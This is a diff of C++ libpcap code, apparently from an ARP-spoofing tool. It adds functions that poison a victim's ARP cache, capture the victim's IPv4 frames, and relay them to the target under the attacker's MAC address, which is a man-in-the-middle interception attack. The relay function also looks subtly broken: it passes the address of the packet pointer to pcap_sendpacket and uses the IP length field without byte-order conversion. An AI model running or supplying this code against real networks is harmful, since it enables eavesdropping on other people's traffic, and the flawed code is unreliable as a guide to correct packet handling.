@@ -84,7 +84,7 @@ Mac get_smac(pcap_t* handle){
     }
 }
 
-void attack(pcap_t* handle){
+void infect_sender(pcap_t* handle){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = sender.mac;
@@ -104,6 +104,39 @@ void attack(pcap_t* handle){
 
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+        exit(-1);
+    }
+}
+
+u_char* get_spoofed_packet(pcap_t* handle){
+    static const u_char* packet;
+
+    while(true){
+        struct pcap_pkthdr* header;
+        packet = nullptr;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
+            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+            exit(-1);
+        }
+        PEthHdr eth_hdr = (PEthHdr)packet;
+        if (eth_hdr->type_ != EthHdr::Ip4) continue;
+        if (eth_hdr->smac_ != sender.mac) continue;
+
+        return const_cast<u_char*>(packet);
+    }
+}
+
+void relay(pcap_t* handle, const u_char* packet){
+    PEthHdr eth_hdr = (PEthHdr)packet;
+    eth_hdr->smac_ = attacker.mac;
+    eth_hdr->dmac_ = target.mac;
+
+    PIpHdr ip_hdr = (PIpHdr)(packet + sizeof(EthHdr));
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthHdr)+ip_hdr->tlen);
+    if (res != 0){
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         exit(-1);
     }
